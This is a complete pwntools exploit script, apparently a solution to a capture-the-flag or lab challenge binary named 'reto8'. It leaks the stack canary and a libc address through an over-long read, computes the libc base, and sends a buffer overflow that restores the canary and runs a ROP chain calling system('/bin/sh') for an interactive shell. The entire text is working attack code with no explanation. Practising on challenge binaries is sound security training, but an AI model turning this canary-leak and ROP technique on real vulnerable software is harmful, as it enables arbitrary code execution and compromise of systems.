#!/usr/bin/env python3
from pwn import *

context.terminal = ["x-terminal-emulator", "-e"]
context.arch = "amd64"
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
p = process("./reto8")

# leak canary and libc
# attach(p, "break *0x0000000000401291\ncontinue")
p.sendlineafter(b"length", b"400")
p.sendlineafter(b"input", b"A")
p.recvuntil(b"was:\n")
leak = p.recv(400)
# print(hexdump(leak))
canary = u64(leak[0x28:0x30])
libc_leak = u64(leak[0xe8:0xf0])
libc.address = libc_leak - 0x29E40
print(f"canary: {canary:#x}")
print(f"libc leak: {libc_leak:#x}")
print(f"libc base: {libc.address:#x}")
assert (libc.address & 0xFFF) == 0

# do rop, but addresses are calculated automatically
rop = ROP(libc)
rop.system(next(libc.search(b"/bin/sh\x00")))

payload = b"A"*40
payload += p64(canary)
payload += p64(0) # padding
payload += p64(rop.ret.address) # ret
payload += rop.chain()
p.sendlineafter(b"length", b"400")
p.sendlineafter(b"input", payload)

p.interactive()
